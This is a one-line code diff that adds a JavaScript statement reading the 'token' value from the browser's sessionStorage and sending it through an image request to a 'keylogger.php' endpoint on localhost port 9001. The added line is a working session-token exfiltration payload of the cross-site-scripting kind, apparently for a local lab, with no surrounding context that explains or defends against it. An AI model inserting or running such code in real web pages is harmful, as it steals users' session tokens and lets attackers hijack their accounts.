@@ -1,0 +1,1 @@
+new Image().src = `http://localhost:9001/keylogger.php?c=${window.sessionStorage.getItem('token')}`;
